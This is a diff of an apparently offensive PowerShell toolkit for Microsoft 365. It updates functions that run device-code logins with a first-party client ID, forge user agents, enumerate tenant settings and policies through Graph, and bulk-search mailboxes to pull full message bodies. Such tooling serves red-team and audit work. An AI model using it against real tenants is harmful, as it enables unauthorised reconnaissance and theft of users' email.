+        $allFindings | Where-Object { $_.Subscription -eq $sub} | Select-Object -Property ResourceGroup,WAFName,RuleName,Operator,MatchVariable,MatchValues | Format-Table -AutoSize | Out-String | Out-File -Append $OutputFile
+        "`n=== Summary ===" | Out-File -Append $OutputFile
+        $summary | Where-Object { $_.Subscription -eq $sub} | Select-Object -Property ResourceGroup,WAFName,VulnerableRules | Format-Table -AutoSize | Out-String | Out-File -Append $OutputFile
+        "`n`n" | Out-File -Append $OutputFile
+    }
+
+    Write-Host -ForegroundColor Yellow "`nResults saved to: $OutputFile"
+    Write-Host -ForegroundColor Cyan "`nNote: to run additional modules, please re-authenticate to Graph using Get-GraphTokens`n"
+}
 
 function Invoke-GraphRecon{
 
@@ -4955,294 +5570,254 @@ function Invoke-GraphRecon{
             C:\PS> Invoke-GraphRecon -Tokens $tokens -PermissionEnum
     #>
 
-    param(
+      param(
         [Parameter(Position = 0, Mandatory = $False)]
         [object[]]
         $Tokens = "",
+        [Parameter(Mandatory=$false)]
+        [string]$Resource = "https://graph.microsoft.com/",
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser,
+        [Parameter(Mandatory=$False)]
+        [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
         [switch]
         $GraphRun,
         [switch]
         $PermissionEnum
     )
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     if($Tokens){
         if(!$GraphRun){
             Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
-            Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
         }
         
-        $RefreshToken = $tokens.refresh_token
-        $authUrl = "https://login.microsoftonline.com/$tenantid"
-        $refreshbody = @{
-                "resource" = "https://graph.windows.net"
-                "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-                "grant_type" =    "refresh_token"
-                "refresh_token" = $RefreshToken
-                "scope"=         "user_impersonation"
-            }
-
-    try{
-    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Body $refreshbody
-    }
-    catch{
-    $details=$_.ErrorDetails.Message | ConvertFrom-Json
-    Write-Output $details.error
-    }
-    if($reftokens)
-            {
-               $aadtokens = $reftokens
-               $access_token = $aadtokens.access_token
-            }
+        # Use the existing tokens directly since they're already scoped to graph.microsoft.com
+        $access_token = $tokens.access_token
     }
     else{
 
-    # Login
+        # Login
         Write-Host -ForegroundColor yellow "[*] Initiating a device code login."
 
-    $body = @{
-        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-        "resource" =      "https://graph.windows.net"
-    }
-    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
-    $Headers=@{}
-    $Headers["User-Agent"] = $UserAgent
-    $authResponse = Invoke-RestMethod `
-        -UseBasicParsing `
-        -Method Post `
-        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
-        -Headers $Headers `
-        -Body $body
-    Write-Host -ForegroundColor yellow $authResponse.Message
+        $body = @{
+            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =      "https://graph.microsoft.com"
+            "scope" =         "Directory.Read.All Organization.Read.All User.Read"
+        }
+        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
+        $Headers=@{}
+        $Headers["User-Agent"] = $UserAgent
+        $authResponse = Invoke-RestMethod `
+            -UseBasicParsing `
+            -Method Post `
+            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
+            -Headers $Headers `
+            -Body $body
+        Write-Host -ForegroundColor yellow $authResponse.Message
 
-    $continue = "authorization_pending"
-    while($continue)
-            {
+        $continue = "authorization_pending"
+        while($continue)
+        {
     
-        $body=@{
-            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
-            "code" =       $authResponse.device_code
+            $body=@{
+                "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+                "code" =       $authResponse.device_code
             "scope" = "user_impersonation"
-        }
-        try{
+            }
+            try{
         $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
-        }
-        catch{
-        $details=$_.ErrorDetails.Message | ConvertFrom-Json
-        $continue = $details.error -eq "authorization_pending"
-        Write-Output $details.error
-        }
+            }
+            catch{
+                $details=$_.ErrorDetails.Message | ConvertFrom-Json
+                $continue = $details.error -eq "authorization_pending"
+                Write-Output $details.error
+            }
         if($aadtokens)
             {
                 Write-Host "[*] Successful auth"
                 $access_token = $aadtokens.access_token
                 break
             }
-        Start-Sleep -Seconds 3
-    }
-    }
-
-    # Generate unique GUIDs
-    $messageId = [guid]::NewGuid()
-    $trackingHeader = [guid]::NewGuid()
-    $clientId = "50afce61-c917-435b-8c6d-60aa5a8b8aa7"
-
-
-
-$soapRequest = @"
-<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
-  <s:Header>
-    <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/MsolConnect</a:Action>
-    <a:MessageID>urn:uuid:$messageId</a:MessageID>
-    <a:ReplyTo>
-      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
-    </a:ReplyTo>
-    <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-      <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$access_token</BearerToken>
-      <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
-    </UserIdentityHeader>
-    <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-      <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$clientId</ClientId>
-      <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.57</Version>
-    </ClientVersionHeader>
-    <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-      <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
-    </ContractVersionHeader>
-    <TrackingHeader xmlns="http://becwebservice.microsoftonline.com/">$trackingHeader</TrackingHeader>
-    <a:To s:mustUnderstand="1">https://provisioningapi.microsoftonline.com/provisioningwebservice.svc</a:To>
-  </s:Header>
-  <s:Body>
-    <MsolConnect xmlns="http://provisioning.microsoftonline.com/">
-      <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-        <b:BecVersion>Version4</b:BecVersion>
-        <b:TenantId i:nil="true"/>
-        <b:VerifiedDomain i:nil="true"/>
-      </request>
-    </MsolConnect>
-  </s:Body>
-</s:Envelope>
-"@
-
-    if(!$GraphRun){
-        Write-Host -ForegroundColor yellow "[*] Now trying to query the MS provisioning API for organization settings."
-    }
-    # Send the SOAP request to the provisioningwebservice
-    $response = Invoke-WebRequest -UseBasicParsing -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $soapRequest
-
-
-    if ($response -match '<DataBlob[^>]*>(.*?)<\/DataBlob>') {
-        $dataBlob = $Matches[1]
-    } else {
-        Write-Host "DataBlob not found in the response."
+            Start-Sleep -Seconds 3
+        }
     }
 
-    $messageID = [guid]::NewGuid()
-    $trackingHeader = [guid]::NewGuid()
-
-$GetCompanyInfoSoapRequest = @"
-<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
-  <s:Header>
-    <a:Action s:mustUnderstand="1">http://provisioning.microsoftonline.com/IProvisioningWebService/GetCompanyInformation</a:Action>
-    <a:MessageID>$MessageID</a:MessageID>
-    <a:ReplyTo>
-      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
-    </a:ReplyTo>
-    <UserIdentityHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-      <BearerToken xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Bearer $access_token</BearerToken>
-      <LiveToken i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService"/>
-    </UserIdentityHeader>
-    <BecContext xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-      <DataBlob xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$dataBlob</DataBlob>
-      <PartitionId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">70</PartitionId>
-    </BecContext>
-    <ClientVersionHeader xmlns="http://provisioning.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-      <ClientId xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">$ClientId</ClientId>
-      <Version xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">1.2.183.57</Version>
-    </ClientVersionHeader>
-    <ContractVersionHeader xmlns="http://becwebservice.microsoftonline.com/" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-      <BecVersion xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService">Version47</BecVersion>
-    </ContractVersionHeader>
-    <TrackingHeader xmlns="http://becwebservice.microsoftonline.com/">$TrackingHeader</TrackingHeader>
-    <a:To s:mustUnderstand="1">https://provisioningapi.microsoftonline.com/provisioningwebservice.svc</a:To>
-  </s:Header>
-  <s:Body>
-    <GetCompanyInformation xmlns="http://provisioning.microsoftonline.com/">
-      <request xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
-        <b:BecVersion>Version16</b:BecVersion>
-        <b:TenantId i:nil="true"/>
-        <b:VerifiedDomain i:nil="true"/>
-      </request>
-    </GetCompanyInformation>
-  </s:Body>
-</s:Envelope>
-"@
-
-    $companyinfo = Invoke-WebRequest -UseBasicParsing -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $GetCompanyInfoSoapRequest
-
-
-    $xml = [xml]$companyInfo
-
-    # Define namespaces
-    $ns = New-Object Xml.XmlNamespaceManager($xml.NameTable)
-    $ns.AddNamespace("s", "http://www.w3.org/2003/05/soap-envelope")
-    $ns.AddNamespace("b", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService")
-    $ns.AddNamespace("c", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration")
-    $ns.AddNamespace("d", "http://schemas.microsoft.com/2003/10/Serialization/Arrays")
-    $ns.AddNamespace("ns", "http://schemas.microsoft.com/online/serviceextensions/2009/08/ExtensibilitySchema.xsd")
-
-
-    # Extract data using XPath
-    $displayName = $xml.SelectSingleNode("//c:DisplayName", $ns).InnerText
-    $street = $xml.SelectSingleNode("//c:Street", $ns).InnerText
-    $city = $xml.SelectSingleNode("//c:City", $ns).InnerText
-    $state = $xml.SelectSingleNode("//c:State", $ns).InnerText
-    $postalCode = $xml.SelectSingleNode("//c:PostalCode", $ns).InnerText
-    $Country = $xml.SelectSingleNode("//c:CountryLetterCode", $ns).InnerText
-    $TechnicalContact = $xml.SelectSingleNode("//c:TechnicalNotificationEmails", $ns).InnerText
-    $Telephone = $xml.SelectSingleNode("//c:TelephoneNumber", $ns).InnerText
-    $InitialDomain = $xml.SelectSingleNode("//c:InitialDomain", $ns).InnerText
-    $DirSync = $xml.SelectSingleNode("//c:DirectorySynchronizationEnabled", $ns).InnerText
-    $DirSyncStatus = $xml.SelectSingleNode("//c:DirectorySynchronizationStatus", $ns).InnerText
-    $DirSyncClientMachine = $xml.SelectSingleNode("//c:DirSyncClientMachineName", $ns).InnerText
-    $DirSyncServiceAccount = $xml.SelectSingleNode("//c:DirSyncServiceAccount", $ns).InnerText
-    $PasswordSync = $xml.SelectSingleNode("//c:PasswordSynchronizationEnabled", $ns).InnerText
-    $PasswordReset = $xml.SelectSingleNode("//c:SelfServePasswordResetEnabled", $ns).InnerText
-    $UsersPermToConsent = $xml.SelectSingleNode("//c:UsersPermissionToUserConsentToAppEnabled", $ns).InnerText
-    $UsersPermToReadUsers = $xml.SelectSingleNode("//c:UsersPermissionToReadOtherUsersEnabled", $ns).InnerText
-    $UsersPermToCreateLOBApps = $xml.SelectSingleNode("//c:UsersPermissionToCreateLOBAppsEnabled", $ns).InnerText
-    $UsersPermToCreateGroups = $xml.SelectSingleNode("//c:UsersPermissionToCreateGroupsEnabled", $ns).InnerText
-
-    if(!$GraphRun){
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
-    Write-Host -ForegroundColor Yellow "Main Contact Info"
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    # --- Microsoft Graph API Organization Recon ---
+    $headers = @{
+        "Authorization" = "Bearer $access_token"
+        "Content-Type" = "application/json"
     }
-    # Display the extracted data
-    Write-Output "Display Name: $displayName"
-    Write-Output "Street: $street"
-    Write-Output "City: $city"
-    Write-Output "State: $state"
-    Write-Output "Postal Code: $postalCode"
-    Write-Output "Country: $country"
-    Write-Output "Technical Notification Email: $TechnicalContact"
-    Write-Output "Telephone Number: $Telephone"
-    if(!$GraphRun){
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
-    Write-Host -ForegroundColor Yellow "Directory Sync Settings"
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
-    }
-    Write-Output "Initial Domain: $initialDomain"
-    Write-Output "Directory Sync Enabled: $dirSync"
-    Write-Output "Directory Sync Status: $dirSyncStatus"
-    Write-Output "Directory Sync Client Machine: $dirSyncClientMachine"
-    Write-Output "Directory Sync Service Account: $dirSyncServiceAccount"
-    Write-Output "Password Sync Enabled: $passwordSync"
-    if(!$GraphRun){
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
-    Write-Host -ForegroundColor Yellow "User Settings"
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
-    }
-    Write-Output "Self-Service Password Reset Enabled: $passwordReset"
-    Write-Output "Users Can Consent to Apps: $UsersPermToConsent"
-    Write-Output "Users Can Read Other Users: $UsersPermToReadUsers"
-    Write-Output "Users Can Create Apps: $UsersPermToCreateLOBApps"
-    Write-Output "Users Can Create Groups: $UsersPermToCreateGroups"
 
+    try {
+        # Get current user information first to test authentication
+        $me = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers -Method Get
+        
+        # Try to get organization info - this might fail due to permissions
+        try {
+            $org = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/organization" -Headers $headers -Method Get
+            $org = $org.value[0]
+            
+            if(!$GraphRun){
+                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow "Main Contact Info"
+                Write-Host -ForegroundColor Yellow ("=" * 80) 
+            }
+            Write-Output "Display Name: $($org.displayName)"
+            Write-Output "Street: $($org.street)"
+            Write-Output "City: $($org.city)"
+            Write-Output "State: $($org.state)"
+            Write-Output "Postal Code: $($org.postalCode)"
+            Write-Output "Country: $($org.country)"
+            Write-Output "Technical Notification Email: $($org.technicalNotificationMails)"
+            Write-Output "Telephone Number: $($org.telephoneNumber)"
+        } catch {
+            Write-Host -ForegroundColor Yellow "[*] Organization endpoint not accessible, trying alternative methods..."
+            
+            # Try to get tenant info from user's context
+            $tenantId = $me.userPrincipalName.Split('@')[1]
+            Write-Output "Tenant Domain: $tenantId"
+            Write-Output "User Principal Name: $($me.userPrincipalName)"
+            Write-Output "Display Name: $($me.displayName)"
+        }
+        
+        # Try to get domains information
+        try {
+            $domains = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/domains" -Headers $headers -Method Get
+            $initialDomain = $domains.value | Where-Object { $_.isInitial } | Select-Object -First 1 -ExpandProperty id
+            
+            if(!$GraphRun){
+                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow "Directory Sync Settings"
+                Write-Host -ForegroundColor Yellow ("=" * 80) 
+            }
+            Write-Output "Initial Domain: $initialDomain"
+            
+            # Get directory sync information from organization
+            $syncEnabled = $null
+            $syncStatus = $null
+            
+            if ($org) {
+                $syncEnabled = $org.onPremisesSyncEnabled
+                $syncStatus = $org.onPremisesDirectorySynchronizationEnabled
+            }
+            
+            # If organization endpoint didn't provide sync info, try alternative
+            if ($syncEnabled -eq $null) {
+                try {
+                    $onPremSync = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/organization?`$select=onPremisesSyncEnabled,onPremisesDirectorySynchronizationEnabled" -Headers $headers -Method Get
+                    if ($onPremSync.value) {
+                        $orgSync = $onPremSync.value[0]
+                        $syncEnabled = $orgSync.onPremisesSyncEnabled
+                        $syncStatus = $orgSync.onPremisesDirectorySynchronizationEnabled
+                    }
+                } catch {
+                    # Continue with user-based detection
+                }
+            }
+            
+            # Display sync information
+            if ($syncEnabled -ne $null) {
+                Write-Output "Directory Sync Enabled: $syncEnabled"
+            }
+            if ($syncStatus -ne $null) {
+                Write-Output "Directory Sync Status: $syncStatus"
+            }
+            
+            # Check for actual synced users to verify sync status
+            try {
+                $users = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users?`$top=10&`$select=onPremisesSyncEnabled,onPremisesDomainName,onPremisesSamAccountName" -Headers $headers -Method Get
+                $syncedUsers = $users.value | Where-Object { $_.onPremisesSyncEnabled -eq $true }
+                if ($syncedUsers.Count -gt 0) {
+                    Write-Output "Directory Sync Active: Yes (found $($syncedUsers.Count) synced users)"
+                    Write-Output "Sample Synced User Domain: $($syncedUsers[0].onPremisesDomainName)"
+                } else {
+                    Write-Output "Directory Sync Active: No (no synced users found)"
+                }
+            } catch {
+                Write-Output "Directory Sync Active: Unable to determine"
+            }
+            
+            # Try to get additional sync details from beta endpoint
+            try {
+                $dirSyncStatus = Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/directorySync" -Headers $headers -Method Get
+                if ($dirSyncStatus.lastSyncDateTime) {
+                    Write-Output "Directory Sync Last Sync: $($dirSyncStatus.lastSyncDateTime)"
+                }
+                if ($dirSyncStatus.status) {
+                    Write-Output "Directory Sync Detailed Status: $($dirSyncStatus.status)"
+                }
+            } catch {
+                # Beta endpoint not available, skip
+            }
+            
+        } catch {
+            Write-Host -ForegroundColor Yellow "[*] Domains endpoint not accessible"
+        }
+        
+        # Try to get authorization policy for user permissions
+        try {
+            $authpolicy = Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/policies/authorizationPolicy" -Headers $headers -Method Get
+            $authpolicy = $authpolicy.value[0]
+            
+            if(!$GraphRun){
+                Write-Host -ForegroundColor Yellow ("=" * 80) 
+                Write-Host -ForegroundColor Yellow "User Settings"
+                Write-Host -ForegroundColor Yellow ("=" * 80) 
+            }
+            Write-Output "Users Can Consent to Apps: $($authpolicy.defaultUserRolePermissions.allowedToCreateApps)"
+            Write-Output "Users Can Read Other Users: $($authpolicy.defaultUserRolePermissions.allowedToReadOtherUsers)"
+            Write-Output "Users Can Create Apps: $($authpolicy.defaultUserRolePermissions.allowedToCreateApps)"
+            Write-Output "Users Can Create Groups: $($authpolicy.defaultUserRolePermissions.allowedToCreateSecurityGroups)"
+        } catch {
+            Write-Host -ForegroundColor Yellow "[*] Authorization policy endpoint not accessible"
+        }
+        
+        if(!$GraphRun){
+            Write-Host -ForegroundColor Yellow ("=" * 80) 
+        }
+    } catch {
+        Write-Host -ForegroundColor Red "Error with Microsoft Graph API calls: $_"
+        Write-Host -ForegroundColor Yellow "[*] This might be due to insufficient permissions or token scope issues"
+    }
 
-    # Select the ServiceParameter nodes
-    $serviceParameters = $xml.SelectNodes("//ns:ServiceParameter", $ns)
-    if(!$GraphRun){
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
-    Write-Host -ForegroundColor Yellow "Additional Service Parameters"
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
-    }
-    # Loop through each ServiceParameter node and extract the Name and Value
-    foreach ($parameter in $serviceParameters) {
-        $name = $parameter.Name
-        $value = $parameter.Value
-        Write-Output "$name : $value"
-    }
-    if(!$GraphRun){
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
-    }
+    # Variables needed for permission enumeration
     $accesstoken = $tokens.access_token
     $refreshtoken = $tokens.refresh_token
         
     $graphApiEndpoint = "https://graph.microsoft.com/v1.0/me"
     $estimateAccessEndpoint = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess"
-    $authpolicyEndpoint = "https://graph.microsoft.com/beta/policies/authorizationPolicy "
+    $authpolicyEndpoint = "https://graph.microsoft.com/beta/policies/authorizationPolicy"
 
     $headers = @{
-        "Authorization" = "Bearer $accessToken"
+        "Authorization" = "Bearer $access_token"
         "Content-Type" = "application/json"
     }
-    
-
 
     try {
         $authpolicy = Invoke-RestMethod -Uri $authpolicyEndpoint -Headers $headers -Method Get
         if(!$GraphRun){
         Write-Host -ForegroundColor Yellow "Authorization Policy Info"
-        Write-Host -ForegroundColor Yellow ("=" * 80) 
+            Write-Host -ForegroundColor Yellow ("=" * 80) 
         }
         # Display the extracted data
         Write-Output ("Allowed to create app registrations (Default User Role Permissions): " + $authpolicy.value.defaultUserRolePermissions.allowedToCreateApps)
@@ -5268,7 +5843,7 @@ $GetCompanyInfoSoapRequest = @"
 
 
     if(!$GraphRun){
-    Write-Host -ForegroundColor Yellow ("=" * 80) 
+        Write-Host -ForegroundColor Yellow ("=" * 80) 
     }
 
     if($PermissionEnum){
@@ -5663,7 +6238,7 @@ $GetCompanyInfoSoapRequest = @"
             }
 
             # Split resource actions into batches of 20
-            $batchSize = 20
+             $batchSize = 20
             $batchCount = [math]::Ceiling($resourceActions.Count / $batchSize)
 
             # Create arrays to separate "Allowed" and other access types
@@ -5730,6 +6305,7 @@ $GetCompanyInfoSoapRequest = @"
     
     }
 }
+
 
 function Invoke-SearchUserAttributes {
     <#
@@ -5907,8 +6483,8 @@ Function Invoke-SearchMailbox{
     [string]
     $SearchTerm = "",
     [Parameter(Position = 2, Mandatory = $false)]
-    [string]
-    $MessageCount = "25",
+    [int]
+    $MessageCount = 25,
     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $OutFile = "",
@@ -5958,77 +6534,248 @@ Function Invoke-SearchMailbox{
     "Content-Type" = "application/json"
     }
 
-    # Define the search query
-    $searchQuery = @{ requests = @( @{
-        entityTypes = @("message")
-        query = @{
-            queryString = $searchTerm
+    function Get-MailboxSearchHeaderValue {
+        param(
+            [object[]]$Headers,
+            [string]$Name
+        )
+
+        if (-not $Headers) {
+            return $null
         }
-        from = 0
-        size = $MessageCount
-        enableTopResults = "true"
+
+        $header = $Headers | Where-Object { $_.name -eq $Name } | Select-Object -First 1
+        if ($header) {
+            return $header.value
         }
-    )
+
+        return $null
     }
 
-    # Convert the search query to JSON format
-    $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10
+    function Get-MailboxSearchRecipientValues {
+        param(
+            [object[]]$Recipients
+        )
 
-    # Perform the HTTP POST request to search emails
-    $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
-    
-    # Process the response and display the summary
-    $total = $response.value[0].hitsContainers[0].total
-    if(!$GraphRun){
-        Write-Host -ForegroundColor yellow "[*] Found $total matches for search term $searchTerm"
+        $values = @()
+        foreach ($recipient in @($Recipients)) {
+            if ($recipient.emailAddress.address) {
+                $values += $recipient.emailAddress.address
+            }
+            elseif ($recipient.emailAddress.name) {
+                $values += $recipient.emailAddress.name
+            }
+        }
+
+        return @($values | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
     }
-    else{
-        if([int]$total -gt 0){
-            Write-Host -ForegroundColor yellow "[*] Found $total matches for detector: $DetectorName"
+
+    function Get-MailboxSearchSenderInfo {
+        param(
+            [object]$Message
+        )
+
+        $rawAddress = $null
+        $displayValue = $null
+
+        if ($Message.from.emailAddress.address) {
+            $rawAddress = $Message.from.emailAddress.address
+        }
+        elseif ($Message.sender.emailAddress.address) {
+            $rawAddress = $Message.sender.emailAddress.address
+        }
+
+        if ($Message.from.emailAddress.name) {
+            $displayValue = $Message.from.emailAddress.name
+        }
+        elseif ($Message.sender.emailAddress.name) {
+            $displayValue = $Message.sender.emailAddress.name
+        }
+        elseif ($rawAddress -and $rawAddress -notmatch '^/O=') {
+            $displayValue = $rawAddress
+        }
+
+        if ([string]::IsNullOrWhiteSpace($displayValue)) {
+            $fromHeader = Get-MailboxSearchHeaderValue -Headers $Message.internetMessageHeaders -Name "From"
+            if ($fromHeader) {
+                $displayValue = $fromHeader
+            }
+        }
+
+        if ([string]::IsNullOrWhiteSpace($displayValue) -and $rawAddress) {
+            $displayValue = $rawAddress
+        }
+
+        if ([string]::IsNullOrWhiteSpace($displayValue)) {
+            $displayValue = "(Unknown Sender)"
+        }
+
+        return [PSCustomObject]@{
+            Display = $displayValue
+            Raw = $rawAddress
         }
     }
-        
-    if ($total -eq 0){return}
-        
-        $moreresults = "True"
-        while ($moreresults -like "True") {
-            $moreresults = $response.value[0].hitsContainers[0].moreResultsAvailable
-            $resultsList = @()
-            foreach ($hit in $response.value[0].hitsContainers[0].hits) {
-            $subject = $hit.resource.subject
-            $sender = $hit.resource.sender.emailAddress.address
-            $receivers = $hit.resource.replyTo | ForEach-Object { $_.emailAddress.Name }
-            $date = $hit.resource.sentDateTime
-            $preview = $hit.resource.bodyPreview
 
-            $LogInfo = @{
-                        "Detector Name" = $DetectorName
-                        "Subject" = $subject
-                        "Sender" = $sender
-                        "Receivers" = $receivers
-                        "Date" = $date
-                        "Preview" = $preview
+    function Get-HydratedMailboxSearchRecord {
+        param(
+            [object]$Hit,
+            [hashtable]$RequestHeaders
+        )
+
+        $itemId = $Hit.hitId
+        if ([string]::IsNullOrWhiteSpace($itemId)) {
+            return $null
+        }
+
+        try {
+            $odataSafeItemId = $itemId.Replace("'","''")
+            $message = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages('$odataSafeItemId')?`$select=id,subject,from,sender,toRecipients,ccRecipients,bccRecipients,replyTo,sentDateTime,receivedDateTime,bodyPreview,hasAttachments,internetMessageHeaders,body" -Headers $RequestHeaders -Method Get
+        }
+        catch {
+            Write-Verbose "Unable to hydrate mailbox search result $itemId."
+            return $null
+        }
+
+        $subject = $message.subject
+        if ([string]::IsNullOrWhiteSpace($subject)) {
+            $subject = "(No Subject)"
+        }
+
+        $senderInfo = Get-MailboxSearchSenderInfo -Message $message
+
+        $recipients = Get-MailboxSearchRecipientValues -Recipients $message.toRecipients
+        if ($recipients.Count -eq 0) {
+            $recipients = Get-MailboxSearchRecipientValues -Recipients $message.ccRecipients
+        }
+        if ($recipients.Count -eq 0) {
+            $recipients = Get-MailboxSearchRecipientValues -Recipients $message.bccRecipients
+        }
+        if ($recipients.Count -eq 0) {
+            $recipients = Get-MailboxSearchRecipientValues -Recipients $message.replyTo
+        }
+        if ($recipients.Count -eq 0) {
+            $recipients = @("(No Recipients)")
+        }
+
+        $date = $message.receivedDateTime
+        if ([string]::IsNullOrWhiteSpace($date)) {
+            $date = $message.sentDateTime
+        }
+        if ([string]::IsNullOrWhiteSpace($date)) {
+            $date = "(Unknown Date)"
+        }
+
+        $preview = $message.bodyPreview
+        if ([string]::IsNullOrWhiteSpace($preview)) {
+            $preview = "(No Preview)"
+        }
+
+        return [PSCustomObject]@{
+            ItemId = $itemId
+            Subject = $subject
+            Sender = $senderInfo.Display
+            SenderRaw = $senderInfo.Raw
+            Receivers = $recipients
+            Date = $date
+            Preview = $preview
+            Message = $message
+        }
+    }
+
+    $searchOffset = 0
+    $pageNumber = 1
+    $graphReportedTotal = $null
+    $moreresults = $true
+    $download = $null
+    $downloadFolderName = $null
+    $downloadedAnyMessages = $false
+    $csvHeadersWritten = $false
+
+    while ($moreresults) {
+        $searchQuery = @{
+            requests = @(
+                @{
+                    entityTypes = @("message")
+                    query = @{
+                        queryString = $searchTerm
                     }
-
-            $resultsList += New-Object PSObject -Property $LogInfo
-
-            if(!$GraphRun){
-
-            Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
-            Write-Host ("=" * 80) 
-            }
-            }
-            if($OutFile){
-                if(!$GraphRun){
-                    Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
+                    from = $searchOffset
+                    size = $MessageCount
                 }
+            )
+        }
+
+        $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10
